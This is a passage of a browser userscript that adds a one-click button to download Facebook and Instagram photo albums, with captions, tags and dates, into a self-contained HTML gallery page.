// ==UserScript==
// @name          Download Facebook and Instagram albums and picturess
// @version       3.0
// @description   Download Facebook & Instagram Album by One Click.
// @namespace     http://userscripts.org/users/83150
// @include       htt*://*.facebook.com/*
// @match         http://*.facebook.com/*
// @match         https://*.facebook.com/*
// @include       htt*://instagram.com/*
// @match         http://instagram.com/*
// @exclude       htt*://*static*.facebook.com*
// @exclude       htt*://*channel*.facebook.com*
// @exclude       htt*://developers.facebook.com/*
// @exclude       htt*://upload.facebook.com/*
// @exclude       htt*://*onnect.facebook.com/*
// @exclude       htt*://*acebook.com/connect*
// @exclude       htt*://*.facebook.com/plugins/*
// @exclude       htt*://*.facebook.com/l.php*
// @exclude       htt*://*.facebook.com/ai.php*
// @exclude       htt*://*.facebook.com/extern/*
// @exclude       htt*://*.facebook.com/pagelet/*
// @exclude       htt*://api.facebook.com/static/*
// @exclude       htt*://*.facebook.com/contact_importer/*
// @exclude       htt*://*.facebook.com/ajax/*
// @exclude       htt*://www.facebook.com/places/map*_iframe.php*
// ==/UserScript==
(function(){
if(document.querySelector('#dFA')||(location.href.indexOf('//www.facebook.com')<0&&location.href.indexOf('instagram.com')<0)||location.href.indexOf('php')>-1){return;}
var k=document.createElement('li');k.innerHTML='<a id="dFA" class="navSubmenu" onClick="dFAcore();">DownFbAlbum</a>';
var k2=document.createElement('li');k2.innerHTML='<a id="dFA" class="navSubmenu" onClick="dFAcore(true);">DownFbAlbum(Setup)</a>';
var t=document.querySelector('#userNavigation')||document.querySelector('.dropdown ul');if(t){t.appendChild(k);t.appendChild(k2);}
})()
var g={};
function getParent(child,selector){
var target=child;
while(target&&!target.querySelector(selector)&&target.parentNode!=document.body){
target=target.parentNode;
}
return (target)?target.querySelector(selector):null;
}
function getText(s){
	var q=qSA(s)[0],t='textContent';
	if(q&&q.innerHTML.indexOf('<br>')>0){t='innerHTML';}
	return q?q[t]:"";
}
function qS(s){return document.querySelector(s);}
function qSA(s){return document.querySelectorAll(s);}
function output(){
	if(!location.href.match("/instagram.com/")){
		document.title=g.photodata.aName;
		var t=qS('.navLink');
		t.innerHTML=g.statusText;
		var b=qS('#stopAjax');
		if(b){t.parentNode.removeChild(b);}
	}else{
		qS('#link_profile strong').textContent=g.Env[1].username;
		document.title=g.photodata.aName;
	}
	sendRequest({type:'export',data:g.photodata});
}
function fbAjax(){
	var len=g.photodata.photos.length,i=g.ajaxLoaded;
	var src=g.photodata.photos[i].href;
	src=src.split("&")[0];src=src.slice(src.indexOf("=")+1);
	//console.log(src);
	if(g.dataLoaded[src]!==undefined){
		var t=g.dataLoaded[src];
		g.photodata.photos[i].title=t.title;
		g.photodata.photos[i].tag=t.tag;
		g.photodata.photos[i].date=t.date;
		delete g.dataLoaded[src];
		g.ajaxLoaded++;
		if(len<50||i%15==0)console.log('Loaded '+(i+1)+' of '+len+'. (cached)');
		qS('.navLink').textContent='Loading '+(i+1)+' of '+len+'.';
		if(i+1!=len){document.title="("+(i+1)+"/"+(len)+")"+g.photodata.aName;fbAjax();
		}else{output();}
	}else if(!qS('#stopAjaxCkb')||!qS('#stopAjaxCkb').checked){
	var xhr = new XMLHttpRequest();
	xhr.onload = function() {
		var r=this.response,htmlBase=document.createElement('html');
		htmlBase.innerHTML=r.slice(6,-7);
		var targetJS=htmlBase.querySelectorAll('script'),list=[src];
		for(var k=0;k<targetJS.length;k++){
			var t=targetJS[k].textContent,content=t.slice(t.indexOf('(2, {')+4,t.indexOf('}, true);}')+1);
			if(!content.length||t.indexOf('JSONPTransport')<0){continue;}
			content=JSON.parse(content);
			var require=content.payload.jsmods.require;
			if(require&&(content.id=='pagelet_photo_viewer'||require[0][1]=='addPhotoFbids')){list=require[0][3][0];}
			if(t.indexOf('fbPhotosPhotoTagboxBase')>0||t.indexOf('fbPhotosPhotoCaption')>0){
				var markup=content.payload.jsmods.markup;
				for(var ii=0;ii<markup.length;ii++){
					var markupContent=markup[ii];
					for(var j=0;j<markupContent.length;j++){
						var test=markupContent[j].__html;
						if(!test){continue;}
						var h=document.createElement('div');h.innerHTML=unescape(test);
                        var c=h.querySelectorAll(".fbPhotosPhotoCaption");
                        var b=h.querySelectorAll(".fbPhotosPhotoTagboxes");
                        var a=h.querySelectorAll("abbr");
						if(!c.length){continue;}
						for(var kk=0;kk<c.length;kk++){
							var s=c[kk].querySelector(".hasCaption");
							s=!s?'':s.innerHTML.match(/<br>|<wbr>/)?s.outerHTML.replace(/'/g,'&quot;'):s.textContent;
							var tag=b[kk].querySelector('.tagBox');
							tag=!tag?'':b[kk].outerHTML;
							var date=(a&&a[kk])?new Date(a[kk].dataset.utime*1000+g.timeOffset).toJSON().replace('T',' ').split('.')[0]:'';
							g.dataLoaded[list[kk]]={tag:tag,title:s,date:date};
						}
					}
				}
			}
		}
		if(g.dataLoaded[src]!==undefined){
			var t=g.dataLoaded[src];
			g.photodata.photos[i].title=t.title;
			g.photodata.photos[i].tag=t.tag;
			g.photodata.photos[i].date=t.date;
			delete g.dataLoaded[src];
			g.ajaxLoaded++;
		}
		if(len<50||i%15==0)console.log('Loaded '+(i+1)+' of '+len+'.');
		var t=qS('.navLink');
		if(!t.nextElementSibling){var stopBtn=document.createElement('label');stopBtn.id='stopAjax';stopBtn.innerHTML='<a class="navLink"> | Stop</a><input id="stopAjaxCkb" type="checkbox">';t.parentNode.appendChild(stopBtn);}
		t.textContent='Loaded '+(i+1)+' of '+len+'.';
		if(i+1==len||g.ajaxRetry==1){output();}else{if(i==g.ajaxLoaded){g.ajaxRetry++};
		document.title="("+(i+1)+"/"+(len)+")"+g.photodata.aName;fbAjax();}
	};
	xhr.open("GET", g.photodata.photos[i].ajax);
	xhr.send();}else{output();}
}
function getPhotos(){
	if(g.start!=2||g.start==3){return;}
	if(g.ajaxFailed&&g.mode!=2&&(qS('#fbTimelinePhotosScroller *')||qS('.uiSimpleScrollingLoadingIndicator'))){scrollTo(0, document.body.clientHeight);setTimeout(getPhotos,2000);return;}//g.start=3;
	var i,elms=g.elms||qS('#album_pagelet')||qS('#static_set_pagelet')||qS('#pagelet_photos_stream'),
	photodata=g.photodata,testNeeded=0,ajaxNeeded=0;
	if(g.elms){ajaxNeeded=1;}
	else if(elms){elms=elms.querySelectorAll('a.uiMediaThumb[ajaxify]');ajaxNeeded=1;}
	else{elms=qSA('a:not(.notifMainLink):not(.hidden_elem):not(.egoPhotoImage):not(.uiBlingBox):not(.tickerFullPhoto):not(.pronoun-link):not(.uiVideoLink):not([class*="emuEventfad"])[rel="theater"][ajaxify]');testNeeded=1;}
	if(qSA('.fbPhotoStarGridElement')){ajaxNeeded=1;}
	if(g.mode!=2&&!g.lastLoaded&&(qS('#fbTimelinePhotosScroller *')||qS('.uiSimpleScrollingLoadingIndicator'))&&(!qS('#stopAjaxCkb')||!qS('#stopAjaxCkb').checked)){
		fbAutoLoad(elms);return;
	}
	for (i = 0;i<elms.length;i++) {
		if(testNeeded&&(getParent(elms[i],'.mainWrapper')&&getParent(elms[i],'.mainWrapper').querySelector('.shareSubtext')&&elms[i].childNodes[0]&&elms[i].childNodes[0].tagName=='IMG')||(getParent(elms[i],'.timelineUnitContainer')&&getParent(elms[i],'.timelineUnitContainer').querySelector('.shareUnit'))||(elms[i].querySelector('img')&&!elms[i].querySelector('img').scrollHeight))continue;
		try{
		var url=unescape(elms[i].getAttribute('ajaxify'));
		var ajax=url.slice(url.indexOf("?")+1,url.indexOf("&src")).split("&");
		var q={};for(var j=0;j<ajax.length;j++){var d=ajax[j].split("=");q[d[0]]=d[1];}
		ajax=location.protocol+'//www.facebook.com/ajax/pagelet/generic.php/PhotoViewerInitPagelet?ajaxpipe=1&ajaxpipe_token='+g.Env.ajaxpipe_token+'&no_script_path=1&data='+JSON.stringify(q)+'&__user='+g.Env.user+'&__a=1&__adt=2';
		if(url.match(/&src.(.*)&small/)){url=url.match(/&src.(.*)&small/)[0].slice(5,-6);}
		else{url=url.match(/&src.(.*).jpg|png.&/)[0].slice(5);}
		url=url.replace("s720x720/","");
		/*if(url.indexOf('hphotos-ak')<0){}
		else if(url.indexOf("/sphotos-")>0){url=url.replace(/http.*fbcdn/,"http://a"+Math.floor(Math.random()*8+1)+".sphotos.ak.fbcdn");}
		else if(url.indexOf("/fbcdn-sphotos-")>0){url=url.replace(/http.*akamaihd/,"http://a"+Math.floor(Math.random()*8+1)+".sphotos.ak.fbcdn");}*/
		if(JSON.stringify(photodata.photos).indexOf(url)>0){continue;}
		var title = elms[i].getAttribute('title')||elms[i].querySelector('img')?elms[i].querySelector('img').getAttribute('alt'):''||'';
		title=title.indexOf(' ')>0?title:'';
		title=title.indexOf(': ')>0||title.indexOf('： ')>0?title.slice(title.indexOf(' ')+1):title;
		if(!title){
		var t=getParent(elms[i],'.timelineUnitContainer')||getParent(elms[i],'.mainWrapper');
		if(t){var target1=t.querySelectorAll('.fwb').length>1?'':t.querySelector('.userContent');}
		var target2=elms[i].getAttribute('aria-label')||'';
		if(target2){title=target2;}
		if(title===''&&target1){title=target1.innerHTML.match(/<br>|<wbr>/)?target1.outerHTML.replace(/'/g,'&quot;'):target1.textContent;}
		}
		var newPhoto={url: url,href: elms[i].href,}
		if(!g.largeAlbum){newPhoto.title=title;newPhoto.tag='';}
		if(!g.notLoadCm){newPhoto.ajax=ajax;}
		photodata.photos.push(newPhoto);
		}catch(e){continue;}
	}
	/*if(g.store){
		var temp=escape(JSON.stringify(photodata));
		console.log('sent to bg');
		chrome.extension.sendRequest({type:'store',data:temp,no:photodata.photos.length,add:(g.mode==4||g.mode==3)});
		if(g.mode!=4){
		window.alert('Please go to next page.');
		}else{setTimeout(function(){chrome.extension.sendRequest({type:'export'});},1000);}
	}else{*/
		if(qS('#stopAjaxCkb')&&qS('#stopAjaxCkb').checked){qS('#stopAjaxCkb').checked=false;}
		console.log('export '+photodata.photos.length+' photos.');
		if(!g.notLoadCm){
			if(ajaxNeeded&&(g.loadCm||confirm("Try to load photo's caption?"))){fbAjax();}else{output();}
		}else{output();}
	//}
}
function fbAutoLoad(elms){
	var l; if(g.ajaxStartFrom){
		l=elms[0].href;l=l.slice(l.indexOf('=')+1,l.indexOf('&'));
		if(!g.ajaxStarted){g.ajaxStopAt=l;elms=[];g.ajaxStarted=1;}
		l=g.ajaxStartFrom;
	}
	else{l=elms[elms.length-1].href;l=l.slice(l.indexOf('=')+1,l.indexOf('&'));}
	var p=location.href+'&';var isAl=p.match(/media\/set/),aInfo={},isPS=p.match(/photos_stream/),isGp=p.match(/group/);
	if(isGp){
		p=elms[0].href.split('&')[1];p=p.slice(p.indexOf('.')+1)
		aInfo={"scroll_load":true,"last_fbid":l,"fetch_size":108,"group_id":p};
	}else if(!isAl){
		p=JSON.parse(qS('#pagelet_timeline_main_column').dataset.gt).profile_owner;
		aInfo={"scroll_load":true,"last_fbid":l,"fetch_size":32,"profile_id":+p,"tab_key":"photos"+(isPS?'_stream':''),"sk":"photos"+(isPS?'_stream':'')};
	}else{
		p=p.slice(p.indexOf('=')+1,p.indexOf('&'));
		aInfo={"scroll_load":true,"last_fbid":l,"fetch_size":32,"profile_id":+p.slice(p.lastIndexOf('.')+1),"viewmode":null,"set":p,"type":"1"};
	}
	var targetURL=(isGp?'GroupPhotoset':'TimelinePhotos'+(isAl?'Album':(isPS?'Stream':'')));
	var ajaxAlbum=location.protocol+'//www.facebook.com/ajax/pagelet/generic.php/'+targetURL+'Pagelet?ajaxpipe=1&ajaxpipe_token='+g.Env.ajaxpipe_token+'&no_script_path=1&data='+JSON.stringify(aInfo)+'&__user='+g.Env.user+'&__a=1&__adt=2';
	var xhr = new XMLHttpRequest();
	xhr.onload = function(){
		if(this.status==500){
			if(confirm('Autoload failed.\nTry old method->OK\nOutput loaded photos->Cancel')){g.ajaxFailed=1;}else{g.lastLoaded=1;}fbAutoLoad();return;
		}
		var r=this.response,htmlBase=document.createElement('html');
		htmlBase.innerHTML=r.slice(6,-7);
		var targetJS=htmlBase.querySelectorAll('script'), eCount=0;
		for(var k=0;k<targetJS.length;k++){
			var t=targetJS[k].textContent,content=t.slice(t.indexOf(', {')+2,t.indexOf('}, true);}')+1);
			if(!content.length||t.indexOf('JSONPTransport')<0){continue;}
			content=JSON.parse(content);
			var d=document.createElement('div');
			d.innerHTML=content.payload.content.content;
			var e=d.querySelectorAll('a.uiMediaThumb[ajaxify]');
			if(!e||!e.length)continue;
			eCount+=e.length;
			var old=elms?Array.prototype.slice.call(elms,0):'';
			g.elms=old?old.concat(Array.prototype.slice.call(e,0)):e;
			var t=qS('.navLink');
			if(!t.nextElementSibling){var stopBtn=document.createElement('label');stopBtn.id='stopAjax';stopBtn.innerHTML='<a class="navLink"> | Stop</a><input id="stopAjaxCkb" type="checkbox">';t.parentNode.appendChild(stopBtn);}
			t.textContent='Loading album... ('+g.elms.length+')';
			document.title='('+g.elms.length+')'+g.photodata.aName;
		}
		if(!eCount){console.log('Loaded '+g.elms.length+' photos.');g.lastLoaded=1;}
		if(g.ajaxStartFrom){
			for(var a=0;a<g.elms.length;a++){
				if(g.elms[a].id.indexOf(g.ajaxStopAt)>-1){g.lastLoaded=1;break;}
			}
			var l=g.elms[g.elms.length-1].href;
			g.ajaxStartFrom=l.slice(l.indexOf('=')+1,l.indexOf('&'));
		}
		setTimeout(getPhotos,1000);
	}
	xhr.open("GET", ajaxAlbum);
	xhr.send();
}
function instaAjax(){
	var xhr = new XMLHttpRequest();
	xhr.onload = function() {
		var total=g.total, photodata=g.photodata,
		res=JSON.parse(this.response),elms=res.items;
		if(elms[0].id.indexOf('_')<0)elms=elms[3];
		g.ajax=res.more_available?elms[elms.length-1].id:null;
		for(var i=0;i<elms.length;i++){
			var j=null,url=elms[i].images.standard_resolution.url;
			g.stored.forEach(function(v,k){if(v==url)j=k;});j=!j?photodata.photos.length:j;
			photodata.photos[j]={
			title: elms[i].caption?elms[i].caption.text:'',
			url: url,
			href: elms[i].link,
			date: elms[i].created_time?new Date(elms[i].created_time*1000+g.timeOffset).toJSON().replace('T',' ').split('.')[0]:''
			};
		}
		console.log('Loaded '+photodata.photos.length+' of '+total+' photos.');
		qS('#link_profile strong').textContent='Loaded '+g.photodata.photos.length+' of '+total+' photos.';
		document.title="("+g.photodata.photos.length+"/"+total+")"+g.photodata.aName;
		if(total>photodata.photos.length&&g.ajax){instaAjax();}else{output();}
	}
	xhr.open("GET", 'http://instagram.com/'+g.Env[0].username+'/media?max_id='+g.ajax);
	xhr.send();
}
function getInstagram(){
	if(g.start!=2||g.start==3){return;}g.start=3;
	var i,elms=g.Env[3],photodata=g.photodata;
	for(i=0;i<elms.length;i++){
		var url=elms[i].images.standard_resolution.url;
		g.stored.push(url);
		photodata.photos.push({
			title: elms[i].caption?elms[i].caption.text:'',
			url: url,
			href: elms[i].link,
			date: elms[i].created_time?new Date(elms[i].created_time*1000+g.timeOffset).toJSON().replace('T',' ').split('.')[0]:''
		});
	}
	var elms2=qSA('li.photo');
	if(elms2&&!g.loadCm){ for(i=photodata.photos.length;i<elms2.length;i++){
		var url=elms2[i].querySelector('img')?elms2[i].querySelector('img').src.replace('6.jpg','7.jpg'):elms2[i].querySelector('.image').style.backgroundImage.slice(4,-1).replace('6.jpg','7.jpg');
		g.stored.push(url);
		photodata.photos.push({
			title: '',
			url: url,
			href: elms2[i].querySelector('a').href
		});
	}}else if(g.mode==2&&elms2&&g.loadCm){g.total=elms2.length;}
	if((g.mode!=2||g.loadCm)&&photodata.photos.length!=g.total){g.ajax=elms[elms.length-1].id;instaAjax();}else{output();}
}
unsafeWindow.dFAcore = function(setup) {
	g.start=1;g.settings={};
	if(!setup&&localStorage['dFASetting']){g.settings=localStorage['dFASetting']?JSON.parse(localStorage['dFASetting']):{};}
	g.mode=g.settings.mode||window.prompt('Please type your choice:\nNormal: 1/press Enter\nDownload without auto load: 2\nAutoload start from specific id: 3\nOptimization for large album: 4')||1;
	if(g.mode==null){return;}
	if(g.mode==3){g.ajaxStartFrom=window.prompt('Please enter the fbid:\ni.e. 123456 if photo link is:\nfacebook.com/photo.php?fbid=123456');if(!g.ajaxStartFrom){return;}}
	if(g.mode==4){g.largeAlbum=true;g.mode=window.prompt('Please type your choice:\nNormal: 1/press Enter\nDownload without auto load: 2\nAutoload start from specific id: 3');}
	g.loadCm=g.settings.notLoadCm?0:(g.settings.loadCm||confirm("Try to load photo's caption?"));
	g.notLoadCm=g.settings.notLoadCm||!g.loadCm;
	g.largeAlbum=g.settings.largeAlbum||g.largeAlbum;
	g.settings={mode:g.mode,loadCm:g.loadCm,largeAlbum:g.largeAlbum,notLoadCm:g.notLoadCm};
	localStorage['dFASetting']=JSON.stringify(g.settings);
	var aName=document.title,aAuth="",aDes="",aTime="";g.start=2;
	g.timeOffset=new Date().getTimezoneOffset()/60*-3600000;
	if(!location.href.match("/instagram.com/")){
	if(qS('.fbPhotoAlbumTitle')||qS('.fbxPhotoSetPageHeader')){
	aName=getText("h2")||document.title;
	aAuth=getText('.fbStickyHeaderBreadcrumb .uiButtonText')||getText(".fbxPhotoSetPageHeaderByline a");
	aDes=getText('.fbPhotoCaptionText');
	try{aTime=qS('#globalContainer abbr').title;
	var aLoc=qS('.fbPhotoAlbumActionList').lastChild;
	if((!aLoc.tagName||aLoc.tagName!='SPAN')&&(!aLoc.childNodes.length||(aLoc.childNodes.length&&aLoc.childNodes[0].tagName!='IMG'))){aLoc=aLoc.outerHTML?" @ "+aLoc.outerHTML:aLoc.textContent;aTime=aTime+aLoc;}}catch(e){};
	}
	try{var s=qSA("script")[1].textContent;
	g.Env=JSON.parse(s.slice(s.indexOf("envFlush({")+9,-2));}
	catch(e){var s=qSA("script")[0].textContent;
	g.Env=JSON.parse(s.slice(s.indexOf("envFlush({")+9,-2));}
	g.ajaxLoaded=0;g.dataLoaded={};g.ajaxRetry=0;g.elms='';g.lastLoaded=0;g.ajaxStarted=0;
	g.statusText=qS('.navLink').innerHTML;
	g.photodata = {
		aName:aName.replace(/'|"/g,'\"'),
		aAuth:aAuth.replace(/'|"/g,'\"'),
		aLink:(window.location+"").split("&")[0],
		aTime:aTime,
		photos: [],
		aDes:aDes,
		largeAlbum:g.largeAlbum
	};
	getPhotos();
	}else{
		var s=qSA("script")
		for(var i=0;i<s.length;i++){
			if(!s[i].src&&s[i].textContent.indexOf('_jscalls')>0){s=s[i].textContent;break;}
		}
		g.Env=JSON.parse(s.slice(s.indexOf('["user'),s.lastIndexOf(',')))[2];g.stored=[];
		g.total=g.mode!=2?qS('.number-stat').textContent*1:g.Env[3].length;
		console.log(g.Env);
		aName=g.Env[0].full_name;
		if(!aName)aName='Instagram';
		aAuth=g.Env[0].username;
		aLink=g.Env[0].website;
		if(!aLink)aLink='http://instagram.com/'+aAuth;
		g.photodata = {
			aName:aName.replace(/'|"/g,'\"'),
			aAuth:aAuth,
			aLink:aLink,
			aTime:'Last Update: '+new Date(g.Env[3][0].created_time*1000+g.timeOffset).toJSON().replace('T',' ').split('.')[0],
			photos: [],
			aDes:g.Env[0].bio.replace(/'|"/g,'\"')
		};
		getInstagram();
	}
	return;
}
function sendRequest(request, sender, sendResponse) {
switch(request.type){
	case 'store':
		localStorage["downFbAlbum"]=request.data;
		console.log(request.no+' photos data saved.'); break;
	case 'get':
		g.photodata=JSON.parse(localStorage["downFbAlbum"]);
		g.start=2;
		console.log(g.photodata.photos.length+' photos got.');
		getPhotos();
		break;
	case 'export':
		if(!request.data){request.data=JSON.parse(localStorage["downFbAlbum"]);}
		console.log('Exported '+request.data.photos.length+' photos.');
		var a,b=[],c=request.data;
		c.aName=(c.aName)?c.aName:"Facebook";
		var d = c.photos,totalCount = d.length;
		for (var i=0;i<totalCount;i++) {
			if(d[i]){
			var href=d[i].href?d[i].href:'',title=d[i].title||'',tag=d[i].tag||'',tagIndi='',dateInd='';
			href=href?' href="'+href+'" target="_blank"':'';
			if(tag){
				var reg=tag.match(/(\\u\w{4})/g);
				if(reg){
					for(var j=0;j<reg.length;j++){
						tag=tag.replace(reg[j],String.fromCharCode("0x"+reg[j].slice(2)));
					}
				}
				tag='<div class="loadedTag">'+tag+'</div>';
				tagIndi='<i class="tagArrow tagInd"></i>';
			}
			if(d[i].date){dateInd='<div class="dateInd"><span>'+d[i].date+'</span> <i class="tagArrow dateInd"></i></div>';}
			if(title.indexOf('hasCaption')>-1){
			var t=document.createElement('div');
			t.innerHTML=title;
			var junk=t.querySelector('.text_exposed_hide');
			if(junk&&junk.length)t.removeChild(junk)
			title=t.querySelector('.hasCaption').innerHTML;
			var reg=title.match(/(\\u\w{4})/g);
			if(reg){
				for(var j=0;j<reg.length;j++){
					title=title.replace(reg[j],String.fromCharCode("0x"+reg[j].slice(2)));
				}
			}
			if(title.indexOf("<br>")==0)title=title.slice(4);
			}else if(title.indexOf('div')<0&&title.indexOf('span')<0){title=title.replace(/&(?!\w+([;\s]|$))/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");}
			else{try{ $t=$(title); $t.find('.text_exposed_hide').remove().end().find('div *').unwrap().end().find('span').each(function() {$(this).replaceWith(this.childNodes);}); title=$t.html();
				}catch(e){title='';}
			}
			title=title?'<div class="comments"><a class="comments" rel="comments"></a>'+title+'</div>':'<div class="comments"></div>';
			if(c.largeAlbum){var a = '<div rel="gallery" class="largeAlbum item thickbox" id="item'+i+'"><a'+href+'>'+(i*1+1)+'</a><a class="fancybox" rel="fancybox" href="'+d[i].url+'" target="_blank"><div class="crop"><div style="background-image: url('+d[i].url+');" class="img"><img src="'+d[i].url+'"></div></div></a></div>';}
		else{var a = '<div rel="gallery" class="item thickbox" id="item'+i+'"><a'+href+'>'+(i*1+1)+'</a>'+tagIndi+dateInd+'<a class="fancybox" rel="fancybox" href="'+d[i].url+'" target="_blank"><div class="crop"><div style="background-image: url('+d[i].url+');" class="img"><img src="'+d[i].url+'"></div></div></a>'+title+tag+'</div>';}
			b.push(a)}
		}
		var tHTML='<body class="index">'+'<script>document.title=\''+c.aAuth+(c.aAuth?"-":"")+c.aName+'\';</script>';
		tHTML=tHTML+'<style>body{line-height:1;background:#f5f2f2;font-size:13px;color:#444;padding-top:70px;}.crop{width:192px;height:192px;overflow:hidden;}.crop img{display:none;}.img{width:192px;height:192px;background-size:cover;background-position:50% 25%;border:none;image-rendering:optimizeSpeed;}@media screen and (-webkit-min-device-pixel-ratio:0){.img{image-rendering: -webkit-optimize-contrast;}}header{display:block}.wrapper{width:960px;margin:0 auto;position:relative}#hd{background:#faf7f7;position:fixed;z-index:100;top:0;left:0;width:100%;-moz-box-shadow:0 0 5px rgba(0,0,0,0.7);-webkit-box-shadow:0 0 5px rgba(0,0,0,0.7);-o-box-shadow:0 0 5px rgba(0,0,0,0.7);box-shadow:0 0 5px rgba(0,0,0,0.7)}#hd .logo{padding:7px 0;border-bottom:1px solid rgba(0,0,0,0.2)}#container{width:948px;position:relative;margin:0 auto}.item{width:192px;float:left;padding:5px 15px 0;margin:0 7px 15px;font-size:12px;background:white;-moz-box-shadow:0 1px 3px rgba(34,25,25,0.4);-webkit-box-shadow:0 1px 3px rgba(34,25,25,0.4);-o-box-shadow:0 1px 3px rgba(34,25,25,0.4);box-shadow:0 1px 3px rgba(34,25,25,0.4);line-height:1.5}.item .comments{color:#8c7e7e;padding-bottom:15px;overflow:hidden;height:8px;position:relative;}.item .comments:first-child{position:absolute;width:100%;height:100%;top:0;left:0;z-index:1;}#logo{background-color:#3B5998;color:#FFF}#hd .logo h1{background-color:#3B5998;left:0;position:relative;width:100%;display:block;margin:0;color:#FFF;height:100%;font-size:20px}#logo a{color:#FFF}#logo a:hover{color:#FF9}progress{width:100%}#aDes{line-height:1.4;}.largeAlbum{width:15px;height:35px}.largeAlbum>a{visibility:visible;}.largeAlbum *{visibility:hidden;}\
		/* drag */ #output{display:none;background:grey;min-height:200px;margin:20px;padding:10px;border:2px dotted#fff;text-align:center;position:relative;-moz-border-radius:15px;-webkit-border-radius:15px;border-radius:15px;}#output:before{content:"Drag and Drop images.";color:#fff;font-size:50px;font-weight:bold;opacity:0.5;text-shadow:1px 1px#000;position:absolute;width:100%;left:0;top:50%;margin:-50px 0 0;z-index:1;}#output img{display:inline-block;margin:0 10px 10px 0;} button{display:inline-block;vertical-align:baseline;outline:none;cursor:pointer;text-align:center;text-decoration:none;font:700 14px/100% Arial, Helvetica, sans-serif;text-shadow:0 1px 1px rgba(0,0,0,.3);color:#d9eef7;border:solid 1px #0076a3;-webkit-border-radius:.5em;-moz-border-radius:.5em;background-color:#59F;border-radius:.5em;-webkit-box-shadow:0 1px 2px rgba(0,0,0,.2);-moz-box-shadow:0 1px 2px rgba(0,0,0,.2);box-shadow:0 1px 2px rgba(0,0,0,.2);margin:0 2px 12px;padding:.5em 1em .55em;}.cName{display:none;}#fsCount{position: absolute;top: 20;right: 20;font-size: 3em;}\
		/*! fancyBox v2.1.3 fancyapps.com | fancyapps.com/fancybox/#license */\
		.fancybox-wrap,.fancybox-skin,.fancybox-outer,.fancybox-inner,.fancybox-image,.fancybox-wrap iframe,.fancybox-wrap object,.fancybox-nav,.fancybox-nav span,.fancybox-tmp{border:0;outline:none;vertical-align:top;margin:0;padding:0;}.fancybox-wrap{position:absolute;top:0;left:0;z-index:8020;}.fancybox-skin{position:relative;background:#f9f9f9;color:#444;text-shadow:none;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;}.fancybox-opened{z-index:8030;}.fancybox-opened .fancybox-skin{-webkit-box-shadow:0 10px 25px rgba(0,0,0,0.5);-moz-box-shadow:0 10px 25px rgba(0,0,0,0.5);box-shadow:0 10px 25px rgba(0,0,0,0.5);}.fancybox-outer,.fancybox-inner{position:relative;}.fancybox-type-iframe .fancybox-inner{-webkit-overflow-scrolling:touch;}.fancybox-error{color:#444;font:14px/20px "Helvetica Neue",Helvetica,Arial,sans-serif;white-space:nowrap;margin:0;padding:15px;}.fancybox-image,.fancybox-iframe{display:block;width:100%;height:100%;}.fancybox-image{max-width:100%;max-height:100%;}#fancybox-loading,.fancybox-close,.fancybox-prev span,.fancybox-next span{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAACYBAMAAABt8RZRAAAAMFBMVEUAAAABAQEiIiIjIyM4ODhMTExmZmaCgoKAgICfn5+5ubnW1tbt7e3////+/v4PDw+0IcHsAAAAEHRSTlP///////////////////8A4CNdGQAAAAlwSFlzAAALEwAACxMBAJqcGAAAAphJREFUSMftlE1oE0EUgNeCICru0YunaVNNSj3kbim5SqUECh7MxZMUvPQgKBQPggrSSy9SdFVC8Q8XwbNLpWhByRJQE5vsvimIFjxss14KmnTj/GR+Nrs9WH9OeZdlP96+nXnzvjG6qWHsDb+sVJK4AzSqfbgN767PXHimOMfu2zxCaPgujuGoWUA0RuyWjt0y4pHDGm43kQi7qvDF1xKf3lDYWZT4OJZ426Nfl1GO1nIk/tEgr9BEFpCnVRW4XSev87AEn8izJHHnIy1K9j5HnlMtgY98QCydJqPxjTi2gP4CnZT4MC2SJUXoOk/JIodqLHmJpatfHqRFCWMLnF+JbcdaRFmabcvtfHfPy82Pqs2HVlninKdadUw11tIauz+Y69ET+jGECyLdauiHdiB4yOgsvq/j8Bw8KqCRK7AWH4h99wAqAN/6p2po1gX/cXIGQwOZfz7I/xBvbW1VEzhijrT6cATNSzNn72ic4YDbcAvHcOQVe+32dBwsi8OB5wpHXkEc5YKm1M5XdfC+woFyZNi5KrGfZ4OzyX66InCHH3uJTqCYeorrTOCAjfdYXeCIjjeaYNNNxlNiJkPASym88566Aatc10asSAb6szvUEXQGXrD9rAvcXucr8dhKagL/5J9PAO1M6ZXaPG/rGrtPHkjsKEcyeFI1tq462DDVxYGL8k5aVbhrv5E32KR+hQFXKmNvGvrJ2941Rv1pU8fbrv/k5mUHl434VB11yFD5y4YZx+HQjae3pxWVo2mQMAfu/Dd3uDoJd8ahmOZOFr6kuYMsnE9xB+Xgc9IdEi5OukOzaynuIAcXUtwZ662kz50ptpCEO6Nc14E7fxEbiaDYSImuEaZhczc8iEEMYm/xe6btomu63L8A34zOysR2D/QAAAAASUVORK5CYII=);}#fancybox-loading{position:fixed;top:50%;left:50%;margin-top:-22px;margin-left:-22px;background-position:0 -108px;opacity:0.8;cursor:pointer;z-index:8060;}#fancybox-loading div{width:44px;height:44px;}.fancybox-close{position:absolute;top:-18px;right:-18px;width:36px;height:36px;cursor:pointer;z-index:8040;}.fancybox-nav{position:absolute;top:0;width:40%;height:100%;cursor:pointer;text-decoration:none;background:transparent url(data:image/png;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==);-webkit-tap-highlight-color:rgba(0,0,0,0);z-index:8040;}.fancybox-prev{left:0;}.fancybox-next{right:0;}.fancybox-nav span{position:absolute;top:50%;width:36px;height:34px;margin-top:-18px;cursor:pointer;z-index:8040;visibility:hidden;}.fancybox-prev span{left:10px;background-position:0 -36px;}.fancybox-next span{right:10px;background-position:0 